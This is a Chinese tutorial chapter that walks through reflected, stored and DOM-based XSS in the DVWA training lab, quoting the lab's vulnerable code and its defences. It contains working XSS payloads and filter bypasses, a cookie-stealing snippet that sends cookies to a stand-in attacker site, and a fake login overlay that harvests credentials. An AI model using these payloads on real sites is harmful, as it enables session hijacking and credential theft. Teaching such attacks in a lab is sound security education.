# 第11章 DVWA实战 - XSS跨站脚本攻击 🎯

## 开篇引入：XSS到底是个啥？🤔

哈喽各位小伙伴！欢迎来到第11章！今天我们要学习的是Web安全领域里鼎鼎大名的"XSS跨站脚本攻击"。听到这个名字是不是感觉很高端？别怕，听完我给你打的比方，你马上就能懂！

想象一下这个场景 🏪：

你去一个商场的公共留言板上写东西。本来留言板是让大家写"今天天气真好"、"某某餐厅好吃"之类正常话的。但是有一天，有个调皮的人在留言板上写了这么一句话：

> "看到这条留言的人，请马上原地跳三下！不跳就会倒霉！"

结果呢，每个走到留言板前看留言的人，都乖乖地跳了三下。你说搞笑不搞笑？

当然啦，现实中大家可能不会这么傻，但是浏览器会！😆

XSS攻击就跟这个差不多——攻击者往网页里"塞"了一段恶意的JavaScript代码，其他用户访问这个网页的时候，浏览器看到这段代码，就会老老实实地执行它。就像大家看到留言板上的"指令"就去跳三下一样！

举个更具体的例子 👇：

假设你做了一个个人博客网站，允许游客在文章下面留言。有一天，一个攻击者在你的留言框里输入了：
```
<script>alert('你被攻击了！')</script>
```

如果你没有做任何防护，直接把这条留言存到数据库里，然后每次有人打开这篇文章，这条留言就会被显示出来——同时，那段`<script>`标签里的代码也会被执行！于是每个看文章的人都会看到一个弹窗，写着"你被攻击了！"

这就是XSS！是不是一下子就懂了？😎

在这一章里，我们会用DVWA靶场来实战练习XSS攻击，从最简单的Low级别一路打到Impossible级别，让你彻底搞懂XSS的原理和防御方法。准备好了吗？让我们出发吧！🚀

---

## XSS原理大白话 📚

### 什么是XSS？

XSS的全称是Cross-Site Scripting（跨站脚本攻击）。哎？为啥缩写是XSS不是CSS呢？因为CSS已经被"层叠样式表"占用了呀，所以就用X来代替Cross，叫XSS了。

用大白话讲，XSS的原理就是：

> **攻击者往Web页面里插入恶意的JavaScript代码，当其他用户浏览该页面时，这些恶意代码就会在用户的浏览器中执行，从而达到攻击的目的。**

### 为什么会有XSS漏洞？

核心原因就一句话：**用户输入没有经过过滤，直接输出到了页面上。**

打个比方 🎨：

你家有面墙，你允许别人在墙上画画。本来大家都画正常的画儿，但是有个坏人画了个"机关"——谁看到这个机关，谁就得乖乖听他指挥。

为啥坏人能得逞？因为你没有"审核"大家画的内容，直接就让画往墙上贴了。

放到网页里也是一样的道理：
- 用户输入了一段包含`<script>`的内容
- 网站没有检查这段内容有没有问题
- 网站直接把这段内容显示在页面上
- 浏览器看到`<script>`标签，以为是网站自己写的脚本，就执行了

就这么简单！💡

### XSS的危害有多大？

你可能会想：不就是弹个窗吗？有啥大不了的？

千万别小看XSS！弹窗只是最最简单的演示。实际上，通过XSS，攻击者可以做到很多可怕的事情：

- 🍪 **偷取你的Cookie**：偷偷获取你的登录凭证，然后冒充你登录账号
- 🎣 **钓鱼攻击**：伪造一个登录框，骗你输入用户名密码
- 🐴 **挂马**：让你下载病毒木马
- ⌨️ **键盘记录**：记录你在网页上敲的所有内容
- 📝 **篡改网页**：把网页内容改成乱七八糟的东西
- 🔗 **跳转到恶意网站**：把你重定向到诈骗网站

是不是有点后怕了？所以XSS虽然看起来简单，但危害真的不小！

---

## XSS的三种类型 🌈

XSS主要分为三大类，每一类的特点和危害都不太一样。我们一个一个来讲，每个都给你配上生活例子，保证你听完就能分清！

### 1. 反射型XSS（Reflected XSS）💫

**特点：非持久化，需要用户点击特定的URL才会触发。**

啥叫反射型呢？就是恶意代码是"反射"过来的——你发一个请求给服务器，服务器把你请求里的恶意代码又"反射"回页面上了。

生活例子 🏪：

你去商店买东西，跟店员说："我要一个写着'我是笨蛋'的购物袋。"店员就真的给你拿了个写着"我是笨蛋"的袋子。你拿着这个袋子，谁看到袋子上的字，谁就被"攻击"了。

但是注意哦，这个袋子是专门给你一个人的，不会影响其他人。只有你跟店员说了这句话，你才会拿到这个袋子。其他人不这么说，就没事。

反射型XSS就是这样的：
- 恶意代码藏在URL里
- 你访问这个URL，服务器把URL里的内容取出来，放到页面上返回给你
- 只有点击了这个恶意URL的人才会中招
- 换个人访问正常的URL，就啥事没有

**危害程度：中等**（因为需要诱骗用户点击恶意链接）

### 2. 存储型XSS（Stored XSS）💾

**特点：持久化，恶意代码存在数据库里，所有人访问都会中招。**

存储型XSS就厉害了！恶意代码被存到了服务器的数据库里，只要有人访问那个页面，就会被攻击。

生活例子 📋：

还是那个公共留言板。这次有个坏人在留言板上写了"看到这条留言的人请给我100块钱"。然后这条留言被贴在了留言板上，**每个过来看留言板的人都会看到这句话**。

而且，就算坏人走了，留言还在那里。今天来的人能看到，明天来的人也能看到，直到管理员把这条留言删掉为止。

存储型XSS就是这样的：
- 攻击者把恶意代码提交给网站
- 网站把恶意代码存到了数据库里
- 以后每次有人访问相关页面，网站都会从数据库里把恶意代码取出来显示
- 所有访问该页面的用户都会中招

**危害程度：高**（因为不需要诱骗，访问就中招，影响范围大）

### 3. DOM型XSS（DOM Based XSS）🌲

**特点：不经过服务器，完全在浏览器端发生。**

DOM型XSS是三种里面最特殊的一种。它的恶意代码根本不会传到服务器上，完全是在浏览器里"搞事情"。

生活例子 🪞：

你站在一面镜子前面，你对镜子做鬼脸，镜子里的你也对你做鬼脸。这个过程完全是你和镜子之间的互动，跟其他人没关系。

DOM型XSS就是这样的：
- 网页里有一段JavaScript代码，它会从URL里获取某些内容
- 然后这段JS代码把获取到的内容直接插到页面的DOM里
- 整个过程服务器根本不知道，都是浏览器自己干的
- 攻击者就是利用这个过程，在URL里藏恶意代码

**危害程度：中等**（和反射型类似，需要诱骗点击）

### 三种类型对比表 📊

| 类型 | 存储位置 | 是否需要用户点击 | 危害程度 | 常见场景 |
|------|----------|------------------|----------|----------|
| 反射型 | URL里 | 是 | 中等 | 搜索页、错误页 |
| 存储型 | 数据库里 | 否 | 高 | 留言板、评论区 |
| DOM型 | 浏览器端 | 是 | 中等 | 前端路由、页面跳转 |

好啦，三种类型都介绍完了！接下来我们就进入DVWA靶场，一个一个实战体验！🎮

---

## 反射型XSS实战（Reflected XSS）🎯

好的，现在我们打开DVWA，选择"XSS (Reflected)"模块，开始我们的反射型XSS之旅！

### Low级别 - 最简单的开始 🟢

首先把DVWA的安全级别调到Low，然后进入XSS (Reflected) 页面。

#### 看看页面长啥样

一进去你会看到一个输入框，上面写着"What's your name?"（你叫什么名字？），旁边有个Submit按钮。

你试着输入你的名字，比如"小明"，然后点提交。页面上就会显示"Hello 小明"。

嗯，功能很简单：你输入名字，它跟你打个招呼。

#### 第一次尝试XSS攻击

那我们来试试，输入点不一样的东西。在输入框里输入：

```html
<script>alert(1)</script>
```

然后点提交！

哇！弹窗了！🎉 弹出了一个写着"1"的对话框。

恭喜你！你的第一个XSS攻击成功了！😎

#### 为啥会这样？

我们来分析一下。当你输入`<script>alert(1)</script>`的时候：

1. 浏览器把这段内容发送给服务器
2. 服务器收到后，直接把它拼接到返回的HTML里，大概是这样的：
   ```html
   <pre>Hello <script>alert(1)</script></pre>
   ```
3. 浏览器收到HTML后，看到`<script>`标签，就执行了里面的`alert(1)`
4. 然后就弹窗啦！

就这么简单！因为Low级别完全没有任何过滤，你输入啥它就输出啥。

#### 源代码分析

我们来看看Low级别的源代码，验证一下我们的想法：

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

看到了吗？关键就是这一行：
```php
echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
```

它直接把用户通过GET方式传过来的`name`参数，原封不动地输出到了页面上。连检查都不检查一下！

这就是典型的XSS漏洞——用户输入未经过滤直接输出。 💡

> 💡 小知识：你注意到URL变化了吗？提交后URL变成了类似`.../?name=<script>alert(1)</script>`这样的。这就是反射型XSS的特点——恶意代码在URL里！你把这个URL发给别人，别人点开也会弹窗哦！

---

### Medium级别 - 开始有点意思了 🟡

好的，现在我们把安全级别调到Medium，再来试试。

#### 第一次尝试：老办法还行吗？

还是输入`<script>alert(1)</script>`，点提交。

哎？这次没有弹窗了！页面上显示的是"Hello"，后面啥都没有。

咋回事？我们来看看页面源码。哦，原来`<script>`标签被删掉了！所以只剩个"Hello "。

看来Medium级别做了点过滤——它把`<script>`标签给过滤掉了。

#### 绕过思路：怎么对付过滤？

敌人有了防御，我们就得想办法绕过去。过滤`<script>`标签？没问题，我们有N种绕过方法！

**方法一：大小写混合 🔠**

程序员写过滤的时候，有时候只会过滤小写的`<script>`。那我们用大写的`<SCRIPT>`行不行？

来试试，输入：
```html
<SCRIPT>alert(1)</SCRIPT>
```

提交！

哇！又弹窗了！🎉 成功绕过！

为啥能成功？因为HTML标签是不区分大小写的，`<SCRIPT>`和`<script>`在浏览器眼里是一样的。但是如果过滤代码只找小写的，那就被我们钻空子了！

**方法二：双写绕过 📝**

还有一种思路：如果程序是把`<script>`替换成空字符串，那我们能不能在`<script>`中间再插一个`<script>`？

比如写成：
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

你看，中间那个`<script>`会被删掉，剩下的部分拼起来又是一个完整的`<script>`标签！是不是很聪明？😏

当然，在Medium级别里，大小写混合已经能成功了，这个方法可能用不上。但是思路你要记住，以后说不定能用上！

**方法三：用其他标签 🏷️**

就算`<script>`标签被彻底封死了，我们还有很多其他标签可以用！

比如`<img>`标签：
```html
<img src=x onerror=alert(1)>
```

这是什么意思呢？我们来解释一下：
- `<img>`是图片标签，`src`属性指定图片地址
- 我们把`src`设为`x`，这是一个不存在的地址
- `onerror`是一个事件，当图片加载失败时就会执行
- 所以图片加载失败的时候，就会执行`alert(1)`

聪明吧？不需要`<script>`标签照样能执行JS代码！

来试试，肯定也能成功！🎉

类似的标签还有很多，比如：
```html
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<svg onload=alert(1)>
```

这些都可以！XSS的绕过姿势千奇百怪，以后你会学到更多！

#### 源代码分析

我们来看看Medium级别的源代码，看看它到底是怎么过滤的：

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

看到关键代码了吗？
```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
```

它用了`str_replace`函数，把字符串里的`<script>`替换成空字符串。

这个过滤有啥问题呢？
- 只过滤小写的`<script>`，大写的`<SCRIPT>`不管
- 只替换一次，双写就能绕过

所以我们的大小写混合绕过法能成功，就是这个原因！

---

### High级别 - 更严格的过滤 🔴

好，现在我们把难度调到High，继续挑战！

#### 试试之前的方法

先来试试`<SCRIPT>alert(1)</SCRIPT>`——不行。

再试试`<img src=x onerror=alert(1)>`——哎？这个好像可以？还是也不行？

别急，我们来看看High级别的源代码，知己知彼才能百战百胜嘛！

#### 源代码分析

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

哇，这次用了正则表达式！`preg_replace`函数，模式是`/ <(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t /i`。

我们来解读一下这个正则：
- `<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t` - 匹配以`<`开头，中间依次有s、c、r、i、p、t这些字母的内容
- 最后的`/i`表示不区分大小写

也就是说，不管你怎么写，只要标签里有script这几个字母（中间可以插其他东西），都会被过滤掉！大小写混合、双写，都没用了！

#### 怎么绕过？

那怎么办呢？别急，我们还有其他标签可用啊！正则只过滤了带script的标签，其他标签它可没管！

比如我们的老朋友`<img>`标签：
```html
<img src=x onerror=alert(1)>
```

这个里面没有script字样吧？所以不会被过滤！

来试试，输入上面这段代码，提交！

成功！又弹窗了！🎉

还有很多其他标签和事件可以用，比如：
```html
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

这些都可以！因为它们都不包含"script"这个单词，所以正则不会匹配到。

> 💡 小知识：你看，只过滤`<script>`标签是远远不够的！HTML里能执行JavaScript的地方太多了，各种标签的事件属性都可以。所以防御XSS不能靠黑名单，得用更可靠的方法——这个我们后面讲防御的时候再说。

---

### Impossible级别 - 几乎不可能攻破 ⚪

最后我们来看看Impossible级别，学习一下正确的防御姿势。

#### 源代码分析

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

看到关键代码了吗？
```php
$name = htmlspecialchars( $_GET[ 'name' ] );
```

它用了`htmlspecialchars`函数！这个函数是干啥的呢？它会把HTML特殊字符转换成实体字符。

比如：
- `<` 变成 `&lt;`
- `>` 变成 `&gt;`
- `"` 变成 `&quot;`
- `'` 变成 `&#039;`

这样一来，你输入的`<script>`就会变成`&lt;script&gt;`，浏览器看到这个，就知道这是文本内容，不是标签，就不会执行了！

这才是正确的防御方法——输出编码！

你可以试试输入`<script>alert(1)</script>`，看看页面上显示的是什么。没错，就是原封不动的`<script>alert(1)</script>`文本，不会执行。

完美！这就是我们要学的防御方法，后面还会详细讲。

---

## 存储型XSS实战（Stored XSS）💾

好的，反射型XSS我们已经玩明白了，接下来看看更危险的存储型XSS！

在DVWA里选择"XSS (Stored)"模块，我们开始！

### Low级别 - 留言板的故事 🟢

先把安全级别调回Low。

#### 看看页面功能

存储型XSS的页面是一个留言板（Guestbook），有两个输入框：
- Name：你的名字
- Message：留言内容

填好之后点"Sign Guestbook"按钮，就能提交留言。提交后下面会显示所有历史留言。

这不就是我们开篇讲的公共留言板嘛！简直是XSS的温床啊！😈

#### 第一次尝试

我们来试试，在Message里输入：
```html
<script>alert('存储型XSS成功！')</script>
```

Name随便填一个，比如"测试者"，然后点提交。

哇！马上就弹窗了！🎉

而且更厉害的是——你刷新一下页面，它还弹窗！你关掉浏览器再打开，它还弹窗！

为啥？因为这段恶意代码已经被存到数据库里了！每次打开这个页面，都会从数据库里把留言读出来显示，然后每次都会执行！

这就是存储型XSS的可怕之处——一次注入，永久有效！所有访问这个页面的人都会中招！

对比一下反射型和存储型：
- 反射型：你得把恶意URL发给别人，别人点了才中招
- 存储型：啥都不用干，别人自己访问页面就中招

你说哪个危害大？显而易见嘛！😱

#### 源代码分析

我们来看看Low级别的源代码，分两部分：

**存储部分（把留言存进数据库）：**
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

看到了吗？虽然它用了`mysqli_real_escape_string`，但那是防SQL注入的，不是防XSS的！对于XSS来说，它完全没有过滤，用户输入啥就存啥。

**显示部分（把留言从数据库读出来显示）：**
```php
<?php
$query  = "SELECT name, comment FROM guestbook;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

while( $row = mysqli_fetch_assoc( $result ) ) {
    //Get values from the result
    $name = $row["name"];
    $message = $row["comment"];

    //Adjust for
    echo "<div class=\"comment\"><p>{$name}</p><p>{$message}</p></div>";
}
?>
```

输出的时候也是直接输出，没有任何编码。所以XSS就这么发生了！

---

### Medium级别 - 有点防御但不够 🟡

好，调到Medium级别，我们继续。

#### 试试老办法

直接在Message里输入`<script>alert(1)</script>`，提交。

哎？没弹窗了。看看留言内容——script标签被删掉了！

和反射型的Medium一样，也是过滤了`<script>`标签。

#### 绕过方法

和反射型一样的思路：
- 大小写混合：`<SCRIPT>alert(1)</SCRIPT>`
- 用其他标签：`<img src=x onerror=alert(1)>`

来试试`<img>`标签那个，在Message里输入：
```html
<img src=x onerror=alert('存储型绕过成功！')>
```

提交！

成功！弹窗了！🎉

而且跟之前一样，刷新页面还会弹，因为存到数据库里了。

你看，存储型和反射型的绕过思路其实是一样的，只是一个存在URL里，一个存在数据库里。

#### 源代码分析

我们看看Medium级别的存储代码：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

哎？有意思！你看：
- `$message`用了`htmlspecialchars`，所以留言内容是安全的
- 但是`$name`只用了`str_replace('<script>', '', $name)`，只是过滤了script标签

那name字段是不是有问题？但是name输入框那么短，能输入多少东西呢？

嘿嘿，你忘了吗？前端的限制是可以绕过的！我们可以用Burp Suite抓包改包，或者直接修改HTML代码，让name输入框能输入更长的内容！

这就留给你自己去探索啦！💪

---

### High级别 - 更严格的过滤 🔴

High级别和反射型的High差不多，也是用正则过滤了script相关的内容。但是老规矩——我们还有其他标签！

用`<img src=x onerror=alert(1)>`试试看？应该也能成功！

思路都是一样的，就不重复啰嗦啦！你自己动手试试吧！🧪

---

### Impossible级别 - 正确的防御 ⚪

来看看Impossible级别的代码，学习正确姿势：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

看到了吗？不管是`$message`还是`$name`，都用了`htmlspecialchars`函数来处理！

这就对了！输出的时候都做HTML实体编码，不管你输入什么，都只会当成文本显示，不会被当成HTML标签执行。

完美的防御！👍

---

## DOM型XSS实战（DOM Based XSS）🌲

好的，最后我们来看看最特殊的一种——DOM型XSS！

在DVWA里选择"XSS (DOM)"模块，我们开始！

### 什么是DOM型XSS？

在开始之前，我们先回顾一下DOM型XSS的特点：**不经过服务器，完全在浏览器端发生。**

啥意思呢？就是说，整个漏洞的产生过程，服务器根本没参与。是网页里的JavaScript代码自己"作"出来的。

举个例子：网页里有一段JS代码，它会读取URL里的某个参数，然后把这个参数的值直接写到页面上。这个过程完全是浏览器在干，服务器只是把JS代码发给你而已，至于JS代码怎么运行，服务器不管也不知道。

如果攻击者在URL的那个参数里放了恶意代码，JS代码把恶意代码写到页面上，XSS就发生了！

因为恶意代码从来没传到服务器上（或者传了但服务器没动它），所以叫DOM型——完全是DOM操作导致的。

### Low级别 - 最简单的DOM XSS 🟢

先调到Low级别，进入DOM型XSS的页面。

#### 看看页面功能

页面上有个下拉选择框，写着"Please choose your language"（请选择你的语言），有English、French、German、Spanish几个选项。

选一个语言，点Select按钮，页面就会显示你选的语言。

同时你注意一下URL的变化——选了之后URL后面会多一个`?default=English`这样的参数。

#### 发现漏洞

我们来试试，直接在URL里修改`default`参数的值。比如把URL改成：

```
.../vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

然后回车访问！

哇！弹窗了！🎉 DOM型XSS成功！

#### 为啥会这样？源代码分析

我们来看看页面的源代码（注意，是HTML源代码，不是PHP的）：

```html
<div class="vulnerable_code_area">
 
<p>Please choose a language:</p>

<form name="XSS" method="GET">
	<select name="default">
		<script>
			if (document.location.href.indexOf("default=") >= 0) {
				var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
				document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
				document.write("<option value='' disabled='disabled'>----</option>");
			}
			    
			document.write("<option value='English'>English</option>");
			document.write("<option value='French'>French</option>");
			document.write("<option value='Spanish'>Spanish</option>");
			document.write("<option value='German'>German</option>");
		</script>
	</select>
	<input type="submit" value="Select" />
</form>
```

看到那段JavaScript代码了吗？关键是这几句：

```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

翻译成人话就是：
1. 从URL里找到`default=`后面的内容，存到变量`lang`里
2. 用`document.write`把`lang`的值写到页面上

你看！它直接把URL里的内容取出来，就直接写到页面里了！完全没检查有没有问题！

而且整个过程都是在浏览器里执行的，服务器根本不知道发生了什么——服务器只是把这段JS代码发给你而已。

这就是典型的DOM型XSS！💡

---

### Medium级别 - 开始防御 🟡

好，调到Medium级别，我们来看看。

#### 试试老办法

还是在URL里输入`<script>alert(1)</script>`，回车。

哎？没弹窗了。页面上显示的是English，好像参数被改掉了？

我们来看看Medium级别的源代码（还是看前端JS和后端PHP）。

#### 源代码分析

先看看后端PHP代码：
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

哦！后端做了检查——如果`default`参数里包含`<script`（不区分大小写），就直接重定向回`default=English`。

那怎么办呢？后端过滤了script标签，但是DOM型XSS是前端的问题啊……等等，后端直接不让带script的请求通过，那我们就不用script标签呗！

但是等等，还有个问题——我们的输出位置是在`<option>`标签里面的：
```html
<option value='...'>输出在这里</option>
```

如果我们用`<img>`标签，它会在option里面，能执行吗？

试试就知道了！把URL改成：
```
.../vulnerabilities/xss_d/?default=<img src=x onerror=alert(1)>
```

回车……好像不行？页面没反应。

为啥呢？因为`<option>`标签里面不能放其他HTML标签，浏览器会忽略掉。

那怎么办？我们得先把`</option>`标签闭合了，再写我们的代码！

来试试这个：
```
.../vulnerabilities/xss_d/?default=</option><img src=x onerror=alert(1)>
```

解释一下：
- `</option>` - 先把option标签闭合
- `<img src=x onerror=alert(1)>` - 然后再写我们的img标签

这样img标签就不在option里面了，就能正常执行了！

回车访问！

成功！弹窗了！🎉

你看，DOM型XSS也需要考虑输出的位置，选择合适的payload。

---

### High级别 - 更严格的检查 🔴

High级别又加了什么防御呢？我们直接来看看源代码：

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

哇！这次用了白名单！只有French、English、German、Spanish这四个值才被允许，其他的统统重定向。

这……这怎么办？白名单好像很严啊？

别急！别忘了，这是DOM型XSS！后端检查的是URL里的参数，但是——URL里还有个东西叫"锚点"（就是`#`后面的内容）！

锚点有个特点：**它不会被发送到服务器端！** 浏览器在发送请求的时候，会把`#`后面的内容去掉，不会传给服务器。

但是！JavaScript是可以获取到锚点内容的！

那我们是不是可以把恶意代码放到`#`后面？这样服务器看不到，也不会检查，但是前端JS说不定能拿到？

等等，我们再回去看看Low级别的那段JS代码：

```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
```

它是从`document.location.href`里取值的，也就是完整的URL，包括锚点部分！

那我们来构造一个URL：
```
.../vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
```

等等，但是这样的话，`default=`后面是`English#<script>alert(1)</script>`，对吗？因为`indexOf("default=")`找到的是第一个default=的位置。

但是后端检查的是`$_GET['default']`，也就是URL参数里的default，它的值是`English`，因为`#`后面的内容不会传到服务器。所以后端检查通过了！

然后到了前端，JS代码从完整URL里取`default=`后面的内容，就会取到`English#<script>alert(1)</script>`，然后写到页面上……

但是等等，里面有个`#`，还有script标签，能执行吗？

High级别下，前端的JS代码有没有变化？我们来看看。

……

其实这个思路是对的！利用锚点（`#`）来绕过服务端的检查，因为锚点内容不会发到服务器。具体怎么构造payload，就留给你自己去研究啦！这可是个很好的练习机会！💪

> 💡 提示：你需要仔细看JS代码是怎么处理URL的，然后想办法让你的恶意代码被取到并且执行。多试试不同的构造方式，你一定能成功的！

---

### Impossible级别 - 防御DOM XSS ⚪

DOM型XSS怎么防御呢？其实思路和其他XSS一样——不要相信任何外部输入，输出到页面的时候要做编码！

对于DOM型XSS来说，就是前端JavaScript代码在把内容插入到DOM之前，要先做HTML编码，或者用安全的方式来操作DOM（比如用textContent而不是innerHTML）。

具体的我们放到防御部分一起讲！

---

## XSS能做什么？（危害篇）⚠️

好了，三种XSS我们都实战过了。你可能会说："不就是弹个窗吗？有啥大不了的？"

那你可太小看XSS了！弹窗只是最简单的测试。真正的XSS攻击能做的事情多着呢！下面我们就来聊聊XSS的危害。

### 1. 偷取Cookie 🍪（最常见）

这是XSS最经典的用法了！

你登录一个网站后，网站会给你发一个Cookie，里面存着你的登录状态。以后你再访问这个网站，浏览器就会自动带上这个Cookie，网站就知道你是谁了。

如果网站有XSS漏洞，攻击者就可以注入恶意代码，偷偷把你的Cookie偷走！

比如注入这样的代码：
```javascript
<script>
    new Image().src = 'http://攻击者的网站/steal.php?cookie=' + document.cookie;
</script>
```

这段代码干了啥呢？
- 创建了一个图片对象
- 把图片地址设为攻击者的网站，同时把你的Cookie当参数传过去
- 浏览器会尝试加载这个图片，于是你的Cookie就被发送到攻击者的服务器了！

攻击者拿到你的Cookie之后，就可以把你的Cookie设置到他自己的浏览器里，然后冒充你登录你的账号！这就叫"Cookie劫持"或者"会话劫持"。

想象一下，如果是你的支付宝、微信、网银账号被偷了Cookie……后果不堪设想！😱

### 2. 钓鱼攻击 🎣

XSS还可以用来钓鱼。什么是钓鱼呢？就是伪造一个假的登录框，骗你输入用户名密码。

比如攻击者注入这样的代码：
```javascript
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <h2>您的登录已过期，请重新登录</h2>
    <form action="http://攻击者的网站/phish.php">
        用户名：<input type="text" name="username"><br>
        密码：<input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
</div>
```

这段代码会在页面上盖一个全屏的层，显示一个假的登录框，跟真的一模一样。用户一看"哦，登录过期了"，就傻乎乎地输入了用户名密码。

一点登录，信息就发到攻击者那里去了！

这种钓鱼方式比普通的钓鱼网站更难防备，因为它是出现在真实的网站上的！用户一看网址是对的，就放下戒心了。

### 3. 挂马 🐴

挂马就是在网页里植入木马病毒，用户访问了就会中毒。

